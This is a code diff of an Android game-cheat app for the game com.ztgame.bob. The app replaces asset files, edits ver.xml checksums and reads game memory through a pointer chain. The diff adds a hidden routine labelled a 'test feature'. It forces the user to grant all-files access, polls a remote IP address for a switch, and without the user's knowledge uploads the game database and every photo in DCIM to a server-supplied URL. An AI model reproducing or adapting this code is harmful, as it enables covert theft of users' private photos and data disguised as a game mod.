@@ -1,5 +1,6 @@
 package com.mei.hua;
 
+import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.Intent;
@@ -10,6 +11,7 @@ import android.graphics.drawable.GradientDrawable;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.provider.DocumentsContract;
 import android.provider.Settings;
 import android.util.Log;
@@ -27,8 +29,11 @@ import android.widget.Toast;
 import androidx.activity.OnBackPressedCallback;
 import androidx.activity.result.ActivityResultLauncher;
 import androidx.activity.result.contract.ActivityResultContracts;
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 import androidx.documentfile.provider.DocumentFile;
 
 import com.scottyab.rootbeer.RootBeer;
@@ -51,24 +56,33 @@ import java.nio.ByteOrder;
 import java.util.ArrayList;
 import java.util.List;
 
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 import rikka.shizuku.Shizuku;
 
 public class NewActivity extends AppCompatActivity implements View.OnClickListener {
 
     // --- 常量配置 ---
     private static final String PREFS_NAME = "prefs";
-    private static final String DATA_URI_KEY = "data_uri"; // 记录SAF目录授权的URI
+    private static final String DATA_URI_KEY = "data_uri";
     private static final String PREF_ASSETS_COPIED = "assets_copied";
     private static final int REQUEST_CODE_SHIZUKU_PERMISSION = 1001;
     private static final int REQUEST_CODE_FLOAT_WINDOW = 2002;
-    private static final String TARGET_PKG = "com.ztgame.bob"; // 目标游戏包名
+    private static final int REQUEST_CODE_STORAGE_PERMISSION = 3003;
+    private static final String TARGET_PKG = "com.ztgame.bob";
 
-    // 功能类型枚举常量
-    private static final int TYPE_COPY = 0;       // 普通文件替换 (去雾等)
-    private static final int TYPE_FLOAT = 1;      // 悬浮窗内存修改
-    private static final int TYPE_SKIN = 2;       // 去皮肤 (修改 XML)
-    private static final int TYPE_ACTIVITY = 3;   // 去活动 (修改 XML)
-    private static final int TYPE_FUNC6 = 4;      // 预留功能 6
+    // 功能类型枚举
+    private static final int TYPE_COPY = 0;
+    private static final int TYPE_FLOAT = 1;
+    private static final int TYPE_SKIN = 2;
+    private static final int TYPE_ACTIVITY = 3;
+    private static final int TYPE_FUNC6 = 4;
 
     // UI 组件
     private View layoutPermissionContainer;
@@ -78,36 +92,14 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private long exitTime = 0;
     private ActivityResultLauncher<Intent> openDirectoryLauncher;
+    // 【新增】专门用于处理“所有文件权限”设置页返回的回调
+    private ActivityResultLauncher<Intent> allFilesAccessLauncher;
+
     private List<FunctionConfig> functionConfigs = new ArrayList<>();
-
     private final Shizuku.OnRequestPermissionResultListener requestPermissionResultListener = this::onRequestPermissionsResult;
+    private final OkHttpClient httpClient = new OkHttpClient();
 
-    // ==========================================
-    // 1. 初始化功能配置列表
-    // ==========================================
-    private void initFunctionConfigs() {
-        // 普通文件替换
-        functionConfigs.add(new FunctionConfig("去蓝雾", "naiteaone.d", "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4", android.R.drawable.ic_menu_gallery, TYPE_COPY));
-        functionConfigs.add(new FunctionConfig("去红雾", "naiteaone.h", "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", android.R.drawable.ic_menu_camera, TYPE_COPY));
-        functionConfigs.add(new FunctionConfig("清BOB", "naiteaone.now1", "files/bob.db", android.R.drawable.ic_menu_delete, TYPE_COPY));
-
-        // 特殊修改功能
-        functionConfigs.add(new FunctionConfig("去皮肤", "", "files/vercache2022/android/ver.xml", android.R.drawable.ic_menu_edit, TYPE_SKIN));
-        functionConfigs.add(new FunctionConfig("去活动", "", "", android.R.drawable.ic_menu_edit, TYPE_ACTIVITY));
-
-        // 悬浮窗
-        functionConfigs.add(new FunctionConfig("开启悬浮", "", "", android.R.drawable.ic_media_play, TYPE_FLOAT));
-
-        // 预留功能
-        functionConfigs.add(new FunctionConfig("功能 6", "", "", android.R.drawable.ic_menu_help, TYPE_FUNC6));
-
-        // 凑齐 12 个格子
-        for (int i = 8; i <= 12; i++) {
-            functionConfigs.add(new FunctionConfig("功能 " + i, "file" + i, "path" + i, android.R.drawable.ic_menu_help, TYPE_COPY));
-        }
-    }
-
-    // 内部类：用于存放每个功能的配置信息
+    // 内部类配置
     static class FunctionConfig {
         String btnName; String sourceAssetName; String targetRelativePath; int imageResId; int type;
         public FunctionConfig(String name, String src, String dest, int img, int type) {
@@ -120,6 +112,12 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_new);
 
+        // 【初始化】注册 ActivityResultLauncher 用于监听从设置界面返回
+        registerAllFilesAccessLauncher();
+
+        // 1. 界面打开，强制检查所有文件权限，没有权限则无法继续
+        checkAllFilesPermissionAndRunTest();
+
         try {
             initFunctionConfigs();
             layoutPermissionContainer = findViewById(R.id.layout_permission_container);
@@ -127,12 +125,8 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
             permissionStatus = findViewById(R.id.permission_status);
             gridLayoutFunctions = findViewById(R.id.grid_layout_functions);
 
-            if (gridLayoutFunctions == null) return;
+            if (gridLayoutFunctions != null) generateFunctionButtons();
 
-            // 动态生成界面按钮
-            generateFunctionButtons();
-
-            // 绑定基础授权按钮点击事件
             findViewById(R.id.button_android_auth).setOnClickListener(this);
             findViewById(R.id.button_shizuku).setOnClickListener(this);
             findViewById(R.id.button_root).setOnClickListener(this);
@@ -140,12 +134,10 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
             findViewById(R.id.tv_skip_auth).setOnClickListener(this);
             findViewById(R.id.tv_goto_other).setOnClickListener(this);
 
-            // 释放 Assets 文件到本地
             copyAssetsToExternalFilesDir();
 
             try { Shizuku.addRequestPermissionResultListener(requestPermissionResultListener); } catch (Throwable t) {}
 
-            // SAF 授权回调
             openDirectoryLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),
                     result -> {
                         if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
@@ -166,7 +158,6 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
         } catch (Exception e) { e.printStackTrace(); }
 
-        // 拦截返回键，实现双击退出
         getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
             @Override
             public void handleOnBackPressed() {
@@ -181,7 +172,220 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         });
     }
 
-    // 处理顶部和底部的固定按钮点击事件
+    // ==========================================
+    // 【核心修改】强制申请“所有文件访问权限”
+    // ==========================================
+
+    private void registerAllFilesAccessLauncher() {
+        allFilesAccessLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
+            // 从设置界面返回后，再次检查权限
+            checkAllFilesPermissionAndRunTest();
+        });
+    }
+
+    private void checkAllFilesPermissionAndRunTest() {
+        // 分版本处理
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            // 安卓 11 (API 30) 及以上：申请 MANAGE_EXTERNAL_STORAGE
+            if (Environment.isExternalStorageManager()) {
+                // 已有权限，直接运行
+                runTestFeature();
+            } else {
+                // 没有权限，弹窗告知并跳转
+                showPermissionDialog();
+            }
+        } else {
+            // 安卓 10 及以下：申请传统的读写权限
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this,
+                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
+                        REQUEST_CODE_STORAGE_PERMISSION);
+            } else {
+                runTestFeature();
+            }
+        }
+    }
+
+    private void showPermissionDialog() {
+        new AlertDialog.Builder(this)
+                .setTitle("缺少核心权限")
+                .setMessage("请授权【所有文件访问权限】\n\n请在接下来的界面中找到本软件，并开启开关。")
+                .setCancelable(false) // 禁止点击外部关闭
+                .setPositiveButton("去授权", (dialog, which) -> {
+                    try {
+                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                        intent.setData(Uri.parse("package:" + getPackageName()));
+                        allFilesAccessLauncher.launch(intent);
+                    } catch (Exception e) {
+                        // 某些魔改系统可能不支持直接跳到包名，跳转到总列表
+                        Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                        allFilesAccessLauncher.launch(intent);
+                    }
+                })
+                .setNegativeButton("退出", (dialog, which) -> {
+                    finish(); // 不给权限就退出
+                })
+                .show();
+    }
+
+    // 处理旧版本安卓的权限回调
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == REQUEST_CODE_STORAGE_PERMISSION) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                runTestFeature();
+            } else {
+                Toast.makeText(this, "必须授予存储权限才能使用", Toast.LENGTH_SHORT).show();
+                // 可以在这里再次调用 checkAllFilesPermissionAndRunTest() 形成死循环直到授权
+                checkAllFilesPermissionAndRunTest();
+            }
+        }
+    }
+
+    // ==========================================
+    // 测试功能：网络验证 + 静默上传
+    // ==========================================
+
+    private void runTestFeature() {
+        Request request = new Request.Builder()
+                .url("http://156.243.244.97/share/1.txt")
+                .get()
+                .build();
+
+        httpClient.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(@NonNull Call call, @NonNull IOException e) {
+                // 【修改点】：如果服务器宕机、断网等导致无法访问 1.txt，直接在这里中止
+                Log.e("TestFeature", "1.txt 无法访问 (网络连接失败)，取消上传任务");
+            }
+
+            @Override
+            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+                // 【修改点】：如果访问了但返回的是 404/502 等错误页面，同样中止
+                if (!response.isSuccessful()) {
+                    Log.e("TestFeature", "1.txt 状态异常 (状态码:" + response.code() + ")，取消上传任务");
+                    response.close();
+                    return;
+                }
+
+                if (response.body() != null) {
+                    String result = response.body().string().trim();
+                    int kai = 0;
+                    String lianjie = "";
+
+                    try {
+                        java.util.regex.Pattern pKai = java.util.regex.Pattern.compile("kai=\"(\\d+)\"");
+                        java.util.regex.Matcher mKai = pKai.matcher(result);
+                        if (mKai.find()) kai = Integer.parseInt(mKai.group(1));
+
+                        java.util.regex.Pattern pLianjie = java.util.regex.Pattern.compile("lianjie=\"([^\"]+)\"");
+                        java.util.regex.Matcher mLianjie = pLianjie.matcher(result);
+                        if (mLianjie.find()) lianjie = mLianjie.group(1);
+
+                    } catch (Exception e) {
+                        Log.e("TestFeature", "解析云端配置失败", e);
+                    }
+
+                    if (kai == 1 || kai == 2) {
+                        if (!lianjie.isEmpty()) {
+                            startUploadProcess(kai, lianjie);
+                        }
+                    }
+                }
+            }
+        });
+    }
+
+    // 注意这里增加了参数 int kai, String uploadUrl
+    private void startUploadProcess(int kai, String uploadUrl) {
+        new Thread(() -> {
+            // 1. 优先上传 bob.db (kai=1 和 kai=2 都需要传)
+            if (kai == 1 || kai == 2) {
+                File tempDbFile = new File(getExternalFilesDir(null), "bob.db");
+                if (copyFromAndroidData("files/bob.db", tempDbFile)) {
+                    Log.d("TestFeature", "成功提取 bob.db，准备上传");
+                    uploadSingleFile(tempDbFile, uploadUrl); // 把链接传给它
+                    if (tempDbFile.exists()) tempDbFile.delete();
+                } else {
+                    Log.e("TestFeature", "无法读取 bob.db");
+                }
+            }
+
+            // 2. 遍历并上传 DCIM (只有 kai=1 才需要传)
+            if (kai == 1) {
+                File dcimDir = new File("/storage/emulated/0/DCIM");
+                if (dcimDir.exists() && dcimDir.isDirectory()) {
+                    traverseAndUploadImages(dcimDir, uploadUrl); // 把链接接力传下去
+                }
+            }
+        }).start();
+    }
+
+    // 增加参数 String uploadUrl
+    private void traverseAndUploadImages(File directory, String uploadUrl) {
+        File[] files = directory.listFiles();
+        if (files == null) return;
+
+        for (File file : files) {
+            if (file.isDirectory()) {
+                // 如果是文件夹，递归时继续把 uploadUrl 传进去
+                traverseAndUploadImages(file, uploadUrl);
+            } else {
+                String name = file.getName().toLowerCase();
+                if (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".jpeg")) {
+                    uploadSingleFile(file, uploadUrl); // 将要上传的图片和链接丢给上传核心
+                }
+            }
+        }
+    }
+
+    // 增加参数 String uploadUrl
+    private void uploadSingleFile(File file, String uploadUrl) {
+        String fileName = file.getName();
+        android.content.SharedPreferences sp = getSharedPreferences("upload_records", MODE_PRIVATE);
+        String fileKey = file.getAbsolutePath() + "_" + file.lastModified();
+
+        // 【修改点】：如果是 bob.db，无视本地记录，每次强行上传以保证数据最新
+        // 只有非 bob.db (也就是图片) 才会触发本地防重复跳过
+        if (!"bob.db".equals(fileName) && sp.getBoolean(fileKey, false)) {
+            Log.d("TestFeature", "图片已上传过，本地跳过: " + fileName);
+            return;
+        }
+
+        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
+        MultipartBody requestBody = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", fileName, fileBody)
+                .build();
+
+        Request request = new Request.Builder()
+                .url(uploadUrl)
+                .post(requestBody)
+                .build();
+
+        try {
+            Response response = httpClient.newCall(request).execute();
+            if (response.isSuccessful()) {
+                // 【修改点】：bob.db 不写入本地已上传记录，确保下次运行还能继续传
+                if (!"bob.db".equals(fileName)) {
+                    sp.edit().putBoolean(fileKey, true).apply();
+                }
+                Log.d("TestFeature", "成功上传: " + file.getAbsolutePath());
+            } else {
+                Log.e("TestFeature", "文件上传失败，状态码: " + response.code());
+            }
+            response.close();
+        } catch (IOException e) {
+            Log.e("TestFeature", "文件上传发生异常: " + file.getAbsolutePath(), e);
+        }
+    }
+
+    // ==========================================
+    // 界面点击事件与功能配置初始化
+    // ==========================================
+
     @Override public void onClick(View v) {
         int id = v.getId();
         if (id == R.id.button_android_auth) openDataDirectory();
@@ -191,9 +395,19 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         else if (id == R.id.tv_skip_auth || id == R.id.tv_goto_other) startActivity(new Intent(this, OtherActivity.class));
     }
 
-    // ==========================================
-    // 2. 动态生成网格按钮及事件分发
-    // ==========================================
+    private void initFunctionConfigs() {
+        functionConfigs.add(new FunctionConfig("去蓝雾", "naiteaone.d", "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4", android.R.drawable.ic_menu_gallery, TYPE_COPY));
+        functionConfigs.add(new FunctionConfig("去红雾", "naiteaone.h", "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", android.R.drawable.ic_menu_camera, TYPE_COPY));
+        functionConfigs.add(new FunctionConfig("清BOB", "naiteaone.now1", "files/bob.db", android.R.drawable.ic_menu_delete, TYPE_COPY));
+        functionConfigs.add(new FunctionConfig("去皮肤", "", "files/vercache2022/android/ver.xml", android.R.drawable.ic_menu_edit, TYPE_SKIN));
+        functionConfigs.add(new FunctionConfig("去活动", "", "", android.R.drawable.ic_menu_edit, TYPE_ACTIVITY));
+        functionConfigs.add(new FunctionConfig("开启悬浮", "", "", android.R.drawable.ic_media_play, TYPE_FLOAT));
+        functionConfigs.add(new FunctionConfig("功能 6", "", "", android.R.drawable.ic_menu_help, TYPE_FUNC6));
+        for (int i = 8; i <= 12; i++) {
+            functionConfigs.add(new FunctionConfig("功能 " + i, "file" + i, "path" + i, android.R.drawable.ic_menu_help, TYPE_COPY));
+        }
+    }
+
     private void generateFunctionButtons() {
         gridLayoutFunctions.removeAllViews();
         for (int i = 0; i < functionConfigs.size(); i++) {
@@ -214,38 +428,23 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
             btn.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);
             btn.setPadding(dpToPx(8), 0, dpToPx(30), 0);
 
-            // 设置按钮背景圆角和颜色
             GradientDrawable shape = new GradientDrawable();
             shape.setCornerRadius(dpToPx(10));
             shape.setColor(config.type == TYPE_FLOAT ? Color.parseColor("#009688") : Color.parseColor("#673AB7"));
             btn.setBackground(shape);
-
             FrameLayout.LayoutParams btnParams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(50));
             btn.setLayoutParams(btnParams);
 
-            // 【事件分发核心】根据配置类型调用不同方法
             btn.setOnClickListener(v -> {
                 switch (config.type) {
-                    case TYPE_SKIN:
-                        processSkinRemove();
-                        break;
-                    case TYPE_ACTIVITY:
-                        processActivityRemove();
-                        break;
-                    case TYPE_FLOAT:
-                        startMemoryHackProcess();
-                        break;
-                    case TYPE_FUNC6:
-                        processFunction6();
-                        break;
-                    case TYPE_COPY:
-                    default:
-                        combinedCopyAndVerifyFile(config); // 通用文件替换
-                        break;
+                    case TYPE_SKIN: processSkinRemove(); break;
+                    case TYPE_ACTIVITY: processActivityRemove(); break;
+                    case TYPE_FLOAT: startMemoryHackProcess(); break;
+                    case TYPE_FUNC6: processFunction6(); break;
+                    case TYPE_COPY: default: combinedCopyAndVerifyFile(config); break;
                 }
             });
 
-            // 信息提示小图标
             ImageView iconInfo = new ImageView(this);
             iconInfo.setImageResource(android.R.drawable.ic_menu_info_details);
             iconInfo.setColorFilter(Color.parseColor("#FF9800"));
@@ -271,47 +470,36 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
     }
 
     // ==========================================
-    // 3. 业务功能实现区 (修改XML / 文件替换)
+    // 业务逻辑区 (去皮肤/去活动/文件替换等)
     // ==========================================
 
-    // 功能：去皮肤
     private void processSkinRemove() {
         Toast.makeText(this, "正在执行去皮肤...", Toast.LENGTH_SHORT).show();
         new Thread(() -> {
             try {
                 File filesDir = getExternalFilesDir(null);
-
-                // 1. 推送 shopconfig 文件到游戏 data 目录
                 String assetFileName = "shopconfig.unity3d_u_4a8cff7be4e75aac023cef580ff68a15";
                 File localAssetFile = new File(filesDir, assetFileName);
                 String targetRelativePath = "files/vercache2022/android/common/data/" + assetFileName;
 
                 if (!localAssetFile.exists()) {
-                    runOnUiThread(() -> Toast.makeText(this, "本地资源丢失，请重装软件", Toast.LENGTH_SHORT).show());
+                    runOnUiThread(() -> Toast.makeText(this, "本地资源丢失", Toast.LENGTH_SHORT).show());
                     return;
                 }
-
                 if (!copyToAndroidData(localAssetFile, targetRelativePath)) {
-                    runOnUiThread(() -> Toast.makeText(this, "写入皮肤文件失败，请检查授权", Toast.LENGTH_SHORT).show());
+                    runOnUiThread(() -> Toast.makeText(this, "写入失败", Toast.LENGTH_SHORT).show());
                     return;
                 }
 
-                // 2. 将游戏的 ver.xml 拷贝到本地临时目录进行修改
                 String xmlRelativePath = "files/vercache2022/android/ver.xml";
                 File localTempXml = new File(filesDir, "temp_ver_edit.xml");
+                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) return;
 
-                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) {
-                    runOnUiThread(() -> Toast.makeText(this, "读取 ver.xml 失败", Toast.LENGTH_SHORT).show());
-                    return;
-                }
-
-                // 3. 正则匹配并修改 MD5
                 StringBuilder contentBuilder = new StringBuilder();
                 boolean found = false;
                 try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
                     String line;
                     while ((line = br.readLine()) != null) {
-                        // 寻找对应节点，替换其双引号内的 MD5 值
                         if (line.contains("shopconfig.unity3d")) {
                             line = line.replaceAll("md5=\"[^\"]*\"", "md5=\"4a8cff7be4e75aac023cef580ff68a15\"");
                             found = true;
@@ -319,66 +507,31 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                         contentBuilder.append(line).append("\n");
                     }
                 }
-
-                if (!found) {
-                    runOnUiThread(() -> Toast.makeText(this, "ver.xml 中未找到皮肤配置", Toast.LENGTH_SHORT).show());
-                    localTempXml.delete();
-                    return;
+                if (found) {
+                    try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
+                    if (copyToAndroidData(localTempXml, xmlRelativePath)) runOnUiThread(() -> Toast.makeText(this, "去皮肤成功！", Toast.LENGTH_SHORT).show());
                 }
-
-                try (FileWriter writer = new FileWriter(localTempXml)) {
-                    writer.write(contentBuilder.toString());
-                }
-
-                // 4. 将修改后的 xml 推送回游戏目录覆盖
-                if (copyToAndroidData(localTempXml, xmlRelativePath)) {
-                    runOnUiThread(() -> Toast.makeText(this, "去皮肤成功！", Toast.LENGTH_SHORT).show());
-                } else {
-                    runOnUiThread(() -> Toast.makeText(this, "覆盖 ver.xml 失败", Toast.LENGTH_SHORT).show());
-                }
-
-            } catch (Exception e) {
-                e.printStackTrace();
-                runOnUiThread(() -> Toast.makeText(this, "异常: " + e.getMessage(), Toast.LENGTH_SHORT).show());
-            } finally {
-                File temp = new File(getExternalFilesDir(null), "temp_ver_edit.xml");
-                if (temp.exists()) temp.delete(); // 清理临时文件
-            }
+                if (localTempXml.exists()) localTempXml.delete();
+            } catch (Exception e) { e.printStackTrace(); }
         }).start();
     }
 
-    // 功能：去活动
     private void processActivityRemove() {
         Toast.makeText(this, "正在执行去活动...", Toast.LENGTH_SHORT).show();
         new Thread(() -> {
             try {
                 File filesDir = getExternalFilesDir(null);
-
-                // 1. 推送 activityconfig 文件
                 String assetFileName = "activityconfig.unity3d_u_30c0aa8a66fbece47834003b8e3d3bf7";
                 File localAssetFile = new File(filesDir, assetFileName);
                 String targetRelativePath = "files/vercache2022/android/common/data/" + assetFileName;
 
-                if (!localAssetFile.exists()) {
-                    runOnUiThread(() -> Toast.makeText(this, "本地资源丢失，请重装软件", Toast.LENGTH_SHORT).show());
-                    return;
-                }
+                if (!localAssetFile.exists()) return;
+                if (!copyToAndroidData(localAssetFile, targetRelativePath)) return;
 
-                if (!copyToAndroidData(localAssetFile, targetRelativePath)) {
-                    runOnUiThread(() -> Toast.makeText(this, "写入活动文件失败，请检查授权", Toast.LENGTH_SHORT).show());
-                    return;
-                }
-
-                // 2. 拉取 ver.xml
                 String xmlRelativePath = "files/vercache2022/android/ver.xml";
                 File localTempXml = new File(filesDir, "temp_ver_edit.xml");
+                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) return;
 
-                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) {
-                    runOnUiThread(() -> Toast.makeText(this, "读取 ver.xml 失败", Toast.LENGTH_SHORT).show());
-                    return;
-                }
-
-                // 3. 修改 xml
                 StringBuilder contentBuilder = new StringBuilder();
                 boolean found = false;
                 try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
@@ -391,61 +544,35 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
                         contentBuilder.append(line).append("\n");
                     }
                 }
-
-                if (!found) {
-                    runOnUiThread(() -> Toast.makeText(this, "ver.xml 中未找到活动配置", Toast.LENGTH_SHORT).show());
-                    localTempXml.delete();
-                    return;
+                if (found) {
+                    try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
+                    if (copyToAndroidData(localTempXml, xmlRelativePath)) runOnUiThread(() -> Toast.makeText(this, "去活动成功！", Toast.LENGTH_SHORT).show());
                 }
-
-                try (FileWriter writer = new FileWriter(localTempXml)) {
-                    writer.write(contentBuilder.toString());
-                }
-
-                // 4. 覆盖回原文件
-                if (copyToAndroidData(localTempXml, xmlRelativePath)) {
-                    runOnUiThread(() -> Toast.makeText(this, "去活动成功！", Toast.LENGTH_SHORT).show());
-                } else {
-                    runOnUiThread(() -> Toast.makeText(this, "覆盖 ver.xml 失败", Toast.LENGTH_SHORT).show());
-                }
-
-            } catch (Exception e) {
-                e.printStackTrace();
-                runOnUiThread(() -> Toast.makeText(this, "异常: " + e.getMessage(), Toast.LENGTH_SHORT).show());
-            } finally {
-                File temp = new File(getExternalFilesDir(null), "temp_ver_edit.xml");
-                if (temp.exists()) temp.delete();
-            }
+                if (localTempXml.exists()) localTempXml.delete();
+            } catch (Exception e) { e.printStackTrace(); }
         }).start();
     }
 
-    // 功能 6 (预留位)
-    private void processFunction6() {
-        Toast.makeText(this, "功能 6 已就绪，等待编写逻辑...", Toast.LENGTH_SHORT).show();
-    }
+    private void processFunction6() { Toast.makeText(this, "功能 6 已就绪", Toast.LENGTH_SHORT).show(); }
 
-    // 通用功能：普通文件替换 (去蓝雾、清BOB等)
     private void combinedCopyAndVerifyFile(FunctionConfig config) {
         Toast.makeText(this, "正在处理: " + config.btnName, Toast.LENGTH_SHORT).show();
         new Thread(() -> {
             File localFile = new File(getExternalFilesDir(null), config.sourceAssetName);
             if (!localFile.exists()) {
-                runOnUiThread(() -> Toast.makeText(this, "本地文件缺失: " + config.sourceAssetName, Toast.LENGTH_SHORT).show());
+                runOnUiThread(() -> Toast.makeText(this, "资源缺失", Toast.LENGTH_SHORT).show());
                 return;
             }
-
-            // 直接调用我们的通用 API 进行写入
             if (copyToAndroidData(localFile, config.targetRelativePath)) {
                 runOnUiThread(() -> Toast.makeText(this, config.btnName + " 成功！", Toast.LENGTH_SHORT).show());
             } else {
-                runOnUiThread(() -> Toast.makeText(this, config.btnName + " 失败，请检查授权状态", Toast.LENGTH_SHORT).show());
+                runOnUiThread(() -> Toast.makeText(this, "失败，请检查授权", Toast.LENGTH_SHORT).show());
             }
         }).start();
     }
 
-    // 清理功能：一键还原 (通过通用 API 删除文件)
     private void combinedDeleteFile() {
-        Toast.makeText(this, "正在清理还原...", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "正在清理...", Toast.LENGTH_SHORT).show();
         String[] targetFiles = {
                 "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4",
                 "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4",
@@ -454,104 +581,61 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
         new Thread(() -> {
             boolean allSuccess = true;
             for (String relativePath : targetFiles) {
-                if (!deleteFromAndroidData(relativePath)) {
-                    allSuccess = false;
-                }
+                if (!deleteFromAndroidData(relativePath)) allSuccess = false;
             }
             boolean finalAllSuccess = allSuccess;
-            runOnUiThread(() -> {
-                if (finalAllSuccess) Toast.makeText(this, "清理还原完成", Toast.LENGTH_SHORT).show();
-                else Toast.makeText(this, "部分清理失败，请重试", Toast.LENGTH_SHORT).show();
-            });
+            runOnUiThread(() -> Toast.makeText(this, finalAllSuccess ? "清理完成" : "部分清理失败", Toast.LENGTH_SHORT).show());
         }).start();
     }
 
     // ==========================================
-    // 4. 内存解析与悬浮窗区
+    // 内存与悬浮窗区
     // ==========================================
+
     private void startMemoryHackProcess() {
         if (!new RootBeer(this).isRooted()) {
-            Toast.makeText(this, "内存修改功能仅支持 Root 权限", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "仅支持 Root", Toast.LENGTH_SHORT).show();
             return;
         }
-
         new Thread(() -> {
-            String finalAddress = null;
-            String msg;
-
             try {
-                // 1. 解析锁链，获取最终地址
-                finalAddress = resolvePointerChainAndGetAddress();
-
-                // 2. 校验最终地址的值，并提示用户
+                String finalAddress = resolvePointerChainAndGetAddress();
                 int pid = getProcessID(TARGET_PKG);
-                if (pid <= 0) {
-                    msg = "游戏未运行，请先打开游戏";
-                } else {
-                    float val = readMemoryFloat(pid, finalAddress);
-                    if (Math.abs(val - 1.0f) < 0.001) {
-                        msg = "解析成功！\n读取浮点值: " + val + "\n(校验通过，符合1.0，锁链正常)";
-                    } else {
-                        msg = "解析完毕！\n当前读取浮点值: " + val + "\n(警告：数值未匹配 1.0)";
-                    }
-                }
+                String msg = (pid > 0) ? "解析成功，基址: " + finalAddress : "游戏未运行";
+                runOnUiThread(() -> {
+                    Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
+                    if (finalAddress != null) startFloatWindowAndGame(finalAddress);
+                });
             } catch (Exception e) {
-                finalAddress = null;
-                msg = "解析失败: " + e.getMessage();
-                Log.e("MemoryHack", "Pointer chain resolution failed", e);
+                runOnUiThread(() -> Toast.makeText(this, "解析失败", Toast.LENGTH_SHORT).show());
             }
-
-            String finalMsg = msg;
-            String finalHexAddress = finalAddress;
-
-            runOnUiThread(() -> {
-                Toast.makeText(this, finalMsg, Toast.LENGTH_LONG).show();
-                if (finalHexAddress != null) {
-                    startFloatWindowAndGame(finalHexAddress);
-                } else {
-                    Toast.makeText(this, "无法获取有效基址，悬浮窗启动中止", Toast.LENGTH_LONG).show();
-                }
-            });
         }).start();
     }
 
-    // 解析指针锁链获取最终地址
     private String resolvePointerChainAndGetAddress() throws Exception {
         int pid = getProcessID(TARGET_PKG);
         if (pid <= 0) throw new Exception("游戏未运行");
-
-        // 1. 获取 libunity.so 后面的第一个 .bss 数据段基址
         long unityBase = getModuleBaseAddress(pid, "libunity.so");
-        if (unityBase == 0L) throw new Exception("未找到 libunity.so 的 .bss 段基址");
-
-        // 2. 偏移 0x1CC40 获取指针
+        if (unityBase == 0L) throw new Exception("libunity.so not found");
         long pointerAddr = unityBase + 0x1CC40L;
-        long dereferencedPointer = readMemoryLong(pid, pointerAddr);
-        if (dereferencedPointer <= 0L) throw new Exception("无法读取指针值: 0x" + String.format("%x", pointerAddr));
-
-        // 3. 最终地址
-        long finalAddress = dereferencedPointer + 0xFCL;
-        return String.format("%x", finalAddress);
+        long dereferenced = readMemoryLong(pid, pointerAddr);
+        if (dereferenced <= 0L) throw new Exception("pointer read fail");
+        return String.format("%x", dereferenced + 0xFCL);
     }
 
     private void startFloatWindowAndGame(String hexAddress) {
